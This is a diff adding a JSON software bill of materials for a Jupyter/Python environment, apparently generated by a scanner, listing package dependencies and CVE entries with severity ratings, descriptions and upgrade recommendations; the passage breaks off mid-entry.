+      "ref": "pkg:pypi/attrs@21.4.0",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/backcall@0.2.0",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/bleach@4.1.0",
+      "dependsOn": [
+        "pkg:pypi/packaging@21.3",
+        "pkg:pypi/six@1.16.0",
+        "pkg:pypi/webencodings@0.5.1"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/cffi@1.15.0",
+      "dependsOn": [
+        "pkg:pypi/pycparser@2.21"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/colorama@0.4.4",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/commonmark@0.9.1",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/dataclasses@0.8",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/decorator@5.1.1",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/defusedxml@0.7.1",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/entrypoints@0.4",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/importlib-metadata@4.8.3",
+      "dependsOn": [
+        "pkg:pypi/typing-extensions@4.1.1",
+        "pkg:pypi/zipp@3.6.0"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/ipykernel@5.5.6",
+      "dependsOn": [
+        "pkg:pypi/appnope@0.1.3",
+        "pkg:pypi/ipython-genutils@0.2.0",
+        "pkg:pypi/ipython@7.16.3",
+        "pkg:pypi/jupyter-client@7.1.2",
+        "pkg:pypi/tornado@6.1",
+        "pkg:pypi/traitlets@4.3.3"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/ipython-genutils@0.2.0",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/ipython@7.16.3",
+      "dependsOn": [
+        "pkg:pypi/appnope@0.1.3",
+        "pkg:pypi/backcall@0.2.0",
+        "pkg:pypi/colorama@0.4.4",
+        "pkg:pypi/decorator@5.1.1",
+        "pkg:pypi/jedi@0.17.2",
+        "pkg:pypi/pexpect@4.8.0",
+        "pkg:pypi/pickleshare@0.7.5",
+        "pkg:pypi/prompt-toolkit@3.0.29",
+        "pkg:pypi/pygments@2.12.0",
+        "pkg:pypi/traitlets@4.3.3"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/ipywidgets@7.7.0",
+      "dependsOn": [
+        "pkg:pypi/ipykernel@5.5.6",
+        "pkg:pypi/ipython-genutils@0.2.0",
+        "pkg:pypi/ipython@7.16.3",
+        "pkg:pypi/jupyterlab-widgets@1.1.0",
+        "pkg:pypi/nbformat@5.1.3",
+        "pkg:pypi/traitlets@4.3.3",
+        "pkg:pypi/widgetsnbextension@3.6.0"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/jedi@0.17.2",
+      "dependsOn": [
+        "pkg:pypi/parso@0.7.1"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/jinja2@3.0.3",
+      "dependsOn": [
+        "pkg:pypi/markupsafe@2.0.1"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/jsonschema@4.0.0",
+      "dependsOn": [
+        "pkg:pypi/attrs@21.4.0",
+        "pkg:pypi/importlib-metadata@4.8.3",
+        "pkg:pypi/pyrsistent@0.18.0"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/jupyter-client@7.1.2",
+      "dependsOn": [
+        "pkg:pypi/entrypoints@0.4",
+        "pkg:pypi/jupyter-core@4.9.2",
+        "pkg:pypi/nest-asyncio@1.5.5",
+        "pkg:pypi/python-dateutil@2.8.2",
+        "pkg:pypi/pyzmq@22.3.0",
+        "pkg:pypi/tornado@6.1",
+        "pkg:pypi/traitlets@4.3.3"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/jupyter-core@4.9.2",
+      "dependsOn": [
+        "pkg:pypi/pywin32@304",
+        "pkg:pypi/traitlets@4.3.3"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/jupyterlab-pygments@0.1.2",
+      "dependsOn": [
+        "pkg:pypi/pygments@2.12.0"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/jupyterlab-widgets@1.1.0",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/markupsafe@2.0.1",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/mistune@0.8.4",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/nbclient@0.5.9",
+      "dependsOn": [
+        "pkg:pypi/async-generator@1.10",
+        "pkg:pypi/jupyter-client@7.1.2",
+        "pkg:pypi/nbformat@5.1.3",
+        "pkg:pypi/nest-asyncio@1.5.5",
+        "pkg:pypi/traitlets@4.3.3"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/nbconvert@6.0.7",
+      "dependsOn": [
+        "pkg:pypi/bleach@4.1.0",
+        "pkg:pypi/defusedxml@0.7.1",
+        "pkg:pypi/entrypoints@0.4",
+        "pkg:pypi/jinja2@3.0.3",
+        "pkg:pypi/jupyter-core@4.9.2",
+        "pkg:pypi/jupyterlab-pygments@0.1.2",
+        "pkg:pypi/mistune@0.8.4",
+        "pkg:pypi/nbclient@0.5.9",
+        "pkg:pypi/nbformat@5.1.3",
+        "pkg:pypi/pandocfilters@1.5.0",
+        "pkg:pypi/pygments@2.12.0",
+        "pkg:pypi/testpath@0.6.0",
+        "pkg:pypi/traitlets@4.3.3"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/nbformat@5.1.3",
+      "dependsOn": [
+        "pkg:pypi/ipython-genutils@0.2.0",
+        "pkg:pypi/jsonschema@4.0.0",
+        "pkg:pypi/jupyter-core@4.9.2",
+        "pkg:pypi/traitlets@4.3.3"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/nest-asyncio@1.5.5",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/notebook@6.4.10",
+      "dependsOn": [
+        "pkg:pypi/argon2-cffi@21.3.0",
+        "pkg:pypi/ipykernel@5.5.6",
+        "pkg:pypi/ipython-genutils@0.2.0",
+        "pkg:pypi/jinja2@3.0.3",
+        "pkg:pypi/jupyter-client@7.1.2",
+        "pkg:pypi/jupyter-core@4.9.2",
+        "pkg:pypi/nbconvert@6.0.7",
+        "pkg:pypi/nbformat@5.1.3",
+        "pkg:pypi/nest-asyncio@1.5.5",
+        "pkg:pypi/prometheus-client@0.14.1",
+        "pkg:pypi/pyzmq@22.3.0",
+        "pkg:pypi/send2trash@1.8.0",
+        "pkg:pypi/terminado@0.13.0",
+        "pkg:pypi/tornado@6.1",
+        "pkg:pypi/traitlets@4.3.3"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/packaging@21.3",
+      "dependsOn": [
+        "pkg:pypi/pyparsing@3.0.7"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/pandocfilters@1.5.0",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/parso@0.7.1",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/pexpect@4.8.0",
+      "dependsOn": [
+        "pkg:pypi/ptyprocess@0.7.0"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/pickleshare@0.7.5",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/prometheus-client@0.14.1",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/prompt-toolkit@3.0.29",
+      "dependsOn": [
+        "pkg:pypi/wcwidth@0.2.5"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/ptyprocess@0.7.0",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/py@1.11.0",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/pycparser@2.21",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/pygments@2.12.0",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/pyparsing@3.0.7",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/pyrsistent@0.18.0",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/python-dateutil@2.8.2",
+      "dependsOn": [
+        "pkg:pypi/six@1.16.0"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/pywin32@304",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/pywinpty@2.0.3",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/pyzmq@22.3.0",
+      "dependsOn": [
+        "pkg:pypi/cffi@1.15.0",
+        "pkg:pypi/py@1.11.0"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/send2trash@1.8.0",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/six@1.16.0",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/terminado@0.13.0",
+      "dependsOn": [
+        "pkg:pypi/ptyprocess@0.7.0",
+        "pkg:pypi/pywinpty@2.0.3",
+        "pkg:pypi/tornado@6.1"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/testpath@0.6.0",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/tornado@6.1",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/traitlets@4.3.3",
+      "dependsOn": [
+        "pkg:pypi/decorator@5.1.1",
+        "pkg:pypi/ipython-genutils@0.2.0",
+        "pkg:pypi/six@1.16.0"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/typing-extensions@4.1.1",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/wcwidth@0.2.5",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/webencodings@0.5.1",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/widgetsnbextension@3.6.0",
+      "dependsOn": [
+        "pkg:pypi/notebook@6.4.10"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/zipp@3.6.0",
+      "dependsOn": []
+    }
+  ],
+  "vulnerabilities": [
+    {
+      "id": "CVE-2021-32862",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 5.4,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"
+        },
+        {
+          "source": {
+            "name": "nvd"
+          },
+          "score": 5.4,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"
+        }
+      ],
+      "cwes": [
+        79
+      ],
+      "description": "The GitHub Security Lab discovered sixteen ways to exploit a cross-site scripting vulnerability in nbconvert. When using nbconvert to generate an HTML version of a user-controllable notebook, it is possible to inject arbitrary HTML which may lead to cross-site scripting (XSS) vulnerabilities if these HTML notebooks are served by a web server (eg: nbviewer).",
+      "recommendation": "Upgrade nbconvert to version 6.5.1",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2021-32862"
+        },
+        {
+          "url": "https://github.com/jupyter/nbconvert"
+        },
+        {
+          "url": "https://github.com/jupyter/nbconvert/security/advisories/GHSA-9jmq-rx5f-8jwq"
+        },
+        {
+          "url": "https://github.com/jupyter/nbviewer/security/advisories/GHSA-h274-fcvj-h2wm"
+        },
+        {
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/nbconvert/PYSEC-2022-249.yaml"
+        },
+        {
+          "url": "https://lists.debian.org/debian-lts-announce/2023/06/msg00003.html"
+        },
+        {
+          "url": "https://lists.debian.org/debian-lts-announce/2024/09/msg00004.html"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32862"
+        }
+      ],
+      "published": "2022-08-18T19:15:14+00:00",
+      "updated": "2024-11-21T06:07:54+00:00",
+      "affects": [
+        {
+          "ref": "pkg:pypi/nbconvert@6.0.7",
+          "versions": [
+            {
+              "version": "6.0.7",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-29238",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "bitnami"
+          },
+          "score": 4.3,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+        },
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 4.3,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+        },
+        {
+          "source": {
+            "name": "nvd"
+          },
+          "score": 4,
+          "severity": "medium",
+          "method": "CVSSv2",
+          "vector": "AV:N/AC:L/Au:S/C:P/I:N/A:N"
+        },
+        {
+          "source": {
+            "name": "nvd"
+          },
+          "score": 4.3,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+        },
+        {
+          "source": {
+            "name": "ubuntu"
+          },
+          "severity": "medium"
+        }
+      ],
+      "cwes": [
+        425
+      ],
+      "description": "Jupyter Notebook is a web-based notebook environment for interactive computing. Prior to version 6.4.12, authenticated requests to the notebook server with `ContentsManager.allow_hidden = False` only prevented listing the contents of hidden directories, not accessing individual hidden files or files in hidden directories (i.e. hidden files were 'hidden' but not 'inaccessible'). This could lead to notebook configurations allowing authenticated access to files that may reasonably be expected to be disallowed. Because fully authenticated requests are required, this is of relatively low impact. But if a server's root directory contains sensitive files whose only protection from the server is being hidden (e.g. `~/.ssh` while serving $HOME), then any authenticated requests could access files if their names are guessable. Such contexts also necessarily have full access to the server and therefore execution permissions, which also generally grants access to all the same files. So this does not generally result in any privilege escalation or increase in information access, only an additional, unintended means by which the files could be accessed. Version 6.4.12 contains a patch for this issue. There are currently no known workarounds.",
+      "recommendation": "Upgrade notebook to version 6.4.12",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2022-29238"
+        },
+        {
+          "url": "https://github.com/jupyter/notebook"
+        },
+        {
+          "url": "https://github.com/jupyter/notebook/security/advisories/GHSA-v7vq-3x77-87vg"
+        },
+        {
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/notebook/PYSEC-2022-212.yaml"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29238"
+        },
+        {
+          "url": "https://ubuntu.com/security/notices/USN-5585-1"
+        },
+        {
+          "url": "https://www.cve.org/CVERecord?id=CVE-2022-29238"
+        }
+      ],
+      "published": "2022-06-14T18:15:08+00:00",
+      "updated": "2024-11-21T06:58:46+00:00",
+      "affects": [
+        {
+          "ref": "pkg:pypi/notebook@6.4.10",
+          "versions": [
+            {
+              "version": "6.4.10",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-39286",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 8.8,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+        },
+        {
+          "source": {
+            "name": "nvd"
+          },
+          "score": 8.8,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+        },
+        {
+          "source": {
+            "name": "ubuntu"
+          },
+          "severity": "medium"
+        }
+      ],
+      "cwes": [
+        250,
+        269,
+        427
+      ],
+      "description": "Jupyter Core is a package for the core common functionality of Jupyter projects. Jupyter Core prior to version 4.11.2 contains an arbitrary code execution vulnerability in `jupyter_core` that stems from `jupyter_core` executing untrusted files in CWD. This vulnerability allows one user to run code as another. Version 4.11.2 contains a patch for this issue. There are no known workarounds.",
+      "recommendation": "Upgrade jupyter-core to version 4.11.2",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2022-39286"
+        },
+        {
+          "url": "https://github.com/jupyter/jupyter_core"
+        },
+        {
+          "url": "https://github.com/jupyter/jupyter_core/commit/1118c8ce01800cb689d51f655f5ccef19516e283"
+        },
+        {
+          "url": "https://github.com/jupyter/jupyter_core/security/advisories/GHSA-m678-f26j-3hrp"
+        },
+        {
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/jupyter-core/PYSEC-2022-42974.yaml"
+        },
+        {
+          "url": "https://lists.debian.org/debian-lts-announce/2022/11/msg00022.html"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/KKMP5OXXIX2QAUNVNJZ5UEQFKDYYJVBA/"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/YIDN7JMLK6AOMBQI4QPSW4MBQGWQ5NIN/"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KKMP5OXXIX2QAUNVNJZ5UEQFKDYYJVBA"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YIDN7JMLK6AOMBQI4QPSW4MBQGWQ5NIN"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39286"
+        },
+        {
+          "url": "https://security.gentoo.org/glsa/202301-04"
+        },
+        {
+          "url": "https://ubuntu.com/security/notices/USN-6153-1"
+        },
+        {
+          "url": "https://www.cve.org/CVERecord?id=CVE-2022-39286"
+        },
+        {
+          "url": "https://www.debian.org/security/2023/dsa-5422"
+        }
+      ],
+      "published": "2022-10-26T20:15:10+00:00",
+      "updated": "2024-11-21T07:17:57+00:00",
+      "affects": [
+        {
+          "ref": "pkg:pypi/jupyter-core@4.9.2",
+          "versions": [
+            {
+              "version": "4.9.2",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-40896",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "azure"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "cbl-mariner"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 5.5,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+        },
+        {
+          "source": {
+            "name": "nvd"
+          },
+          "score": 5.5,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+        },
+        {
+          "source": {
+            "name": "redhat"
+          },
+          "score": 5.5,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+        },
+        {
+          "source": {
+            "name": "ubuntu"
+          },
+          "severity": "medium"
+        }
+      ],
+      "cwes": [
+        434
+      ],
+      "description": "A ReDoS issue was discovered in pygments/lexers/smithy.py in pygments through 2.15.0 via SmithyLexer.",
+      "recommendation": "Upgrade pygments to version 2.15.0",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2022-40896"
+        },
+        {
+          "url": "https://access.redhat.com/security/cve/CVE-2022-40896"
+        },
+        {
+          "url": "https://github.com/pygments/pygments"
+        },
+        {
+          "url": "https://github.com/pygments/pygments/blob/master/pygments/lexers/smithy.py#L61"
+        },
+        {
+          "url": "https://github.com/pygments/pygments/commit/97eb3d5ec7c1b3ea4fcf9dee30a2309cf92bd194"
+        },
+        {
+          "url": "https://github.com/pygments/pygments/commit/dd52102c38ebe78cd57748e09f38929fd283ad04"
+        },
+        {
+          "url": "https://github.com/pygments/pygments/commit/fdf182a7af85b1deeeb637ca970d31935e7c9d52"
+        },
+        {
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pygments/PYSEC-2023-117.yaml"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/EZGMXALE3HSP4OXC7UUWIKX3OXKZDTY3"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/EZGMXALE3HSP4OXC7UUWIKX3OXKZDTY3/"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/VUZO4BQCIY2S2KZYHERQMKURB7AHXDBO"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/VUZO4BQCIY2S2KZYHERQMKURB7AHXDBO/"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/EZGMXALE3HSP4OXC7UUWIKX3OXKZDTY3/"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VUZO4BQCIY2S2KZYHERQMKURB7AHXDBO/"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-40896"
+        },
+        {
+          "url": "https://pypi.org/project/Pygments"
+        },
+        {
+          "url": "https://pypi.org/project/Pygments/"
+        },
+        {
+          "url": "https://pyup.io/posts/pyup-discovers-redos-vulnerabilities-in-top-python-packages-part-2"
+        },
+        {
+          "url": "https://pyup.io/posts/pyup-discovers-redos-vulnerabilities-in-top-python-packages-part-2/"
+        },
+        {
+          "url": "https://ubuntu.com/security/notices/USN-7128-1"
+        },
+        {
+          "url": "https://www.cve.org/CVERecord?id=CVE-2022-40896"
+        }
+      ],
+      "published": "2023-07-19T15:15:10+00:00",
+      "updated": "2024-11-21T07:22:13+00:00",
+      "affects": [
+        {
+          "ref": "pkg:pypi/pygments@2.12.0",
+          "versions": [
+            {
+              "version": "2.12.0",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-42969",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "cbl-mariner"
+          },
+          "severity": "high"
+        },
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 7.5,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "source": {
+            "name": "nvd"
+          },
+          "score": 7.5,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "source": {
+            "name": "redhat"
+          },
+          "score": 3.1,
+          "severity": "low",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L"
+        }
+      ],
+      "cwes": [
+        1333
+      ],
+      "description": "The py library through 1.11.0 for Python allows remote attackers to conduct a ReDoS (Regular expression Denial of Service) attack via a Subversion repository with crafted info data, because the InfoSvnCommand argument is mishandled. Note: This has been disputed by multiple third parties as not being reproduceable and they argue this is not a valid vulnerability.",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2022-42969"
+        },
+        {
+          "url": "https://access.redhat.com/security/cve/CVE-2022-42969"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-w596-4wvx-j9j6"
+        },
+        {
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/py/PYSEC-2022-42969.yaml"
+        },
+        {
+          "url": "https://github.com/pytest-dev/py"
+        },
+        {
+          "url": "https://github.com/pytest-dev/py/blob/cb87a83960523a2367d0f19226a73aed4ce4291d/py/_path/svnurl.py#L316"
+        },
+        {
+          "url": "https://github.com/pytest-dev/py/issues/287"
+        },
+        {
+          "url": "https://github.com/pytest-dev/py/issues/288"
+        },
+        {
+          "url": "https://github.com/pytest-dev/pytest/issues/10392"
+        },
+        {
+          "url": "https://news.ycombinator.com/item?id=34163710"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-42969"
+        },
+        {
+          "url": "https://pypi.org/project/py"
+        },
+        {
+          "url": "https://www.cve.org/CVERecord?id=CVE-2022-42969"
+        }
+      ],
+      "published": "2022-10-16T06:15:09+00:00",
+      "updated": "2024-11-21T07:25:42+00:00",
+      "affects": [
+        {
+          "ref": "pkg:pypi/py@1.11.0",
+          "versions": [
+            {
+              "version": "1.11.0",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2023-24816",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 4.5,
+          "severity": "low",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"
+        },
+        {
+          "source": {
+            "name": "nvd"
+          },
+          "score": 7,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "cwes": [
+        20,
+        78
+      ],
+      "description": "IPython (Interactive Python) is a command shell for interactive computing in multiple programming languages, originally developed for the Python programming language. Versions prior to 8.1.0 are subject to a command injection vulnerability with very specific prerequisites. This vulnerability requires that the function `IPython.utils.terminal.set_term_title` be called on Windows in a Python environment where ctypes is not available. The dependency on `ctypes` in `IPython.utils._process_win32` prevents the vulnerable code from ever being reached in the ipython binary. However, as a library that could be used by another tool `set_term_title` could be called and hence introduce a vulnerability. Should an attacker get untrusted input to an instance of this function they would be able to inject shell commands as current process and limited to the scope of the current process. Users of ipython as a library are advised to upgrade. Users unable to upgrade should ensure that any calls to the `IPython.utils.terminal.set_term_title` function are done with trusted or filtered input.",
+      "recommendation": "Upgrade ipython to version 8.10.0",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2023-24816"
+        },
+        {
+          "url": "https://github.com/Carreau/ipython/blob/7557ade0ed927475d5ab5b573d0ea4febfb22683/docs/source/whatsnew/version8.rst#ipython-810"
+        },
+        {
+          "url": "https://github.com/ipython/ipython"
+        },
+        {
+          "url": "https://github.com/ipython/ipython/blob/3f0bf05f072a91b2a3042d23ce250e5e906183fd/IPython/utils/terminal.py#L103-L117"
+        },
+        {
+          "url": "https://github.com/ipython/ipython/blob/56e6925dfa50e2c7f4a6471547b8176275db7c25/IPython/utils/_process_win32.py#L20"
+        },
+        {
+          "url": "https://github.com/ipython/ipython/commit/385d69325319a5972ee9b5983638e3617f21cb1f"
+        },
+        {
+          "url": "https://github.com/ipython/ipython/commit/991849c247fc208628879e7ca2923b3c218a5a75"
+        },
+        {
+          "url": "https://github.com/ipython/ipython/security/advisories/GHSA-29gw-9793-fvw7"
+        },
+        {
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/ipython/PYSEC-2023-17.yaml"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-24816"
+        }
+      ],
+      "published": "2023-02-10T20:15:53+00:00",
+      "updated": "2024-11-21T07:48:27+00:00",
+      "affects": [
+        {
+          "ref": "pkg:pypi/ipython@7.16.3",
+          "versions": [
+            {
+              "version": "7.16.3",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2023-28370",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "alma"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "amazon"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 6.1,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+        },
+        {
+          "source": {
+            "name": "nvd"
+          },
+          "score": 6.1,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+        },
+        {
+          "source": {
+            "name": "oracle-oval"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "photon"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "redhat"
+          },
+          "score": 7.4,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:N"
+        },
+        {
+          "source": {
+            "name": "ubuntu"
+          },
+          "severity": "medium"
+        }
+      ],
+      "cwes": [
+        601
+      ],
+      "description": "Open redirect vulnerability in Tornado versions 6.3.1 and earlier allows a remote unauthenticated attacker to redirect a user to an arbitrary web site and conduct a phishing attack by having user access a specially crafted URL.",
+      "recommendation": "Upgrade tornado to version 6.3.2",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2023-28370"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2023:6523"
+        },
+        {
+          "url": "https://access.redhat.com/security/cve/CVE-2023-28370"
+        },
+        {
+          "url": "https://bugzilla.redhat.com/2210199"
+        },
+        {
+          "url": "https://errata.almalinux.org/9/ALSA-2023-6523.html"
+        },
+        {
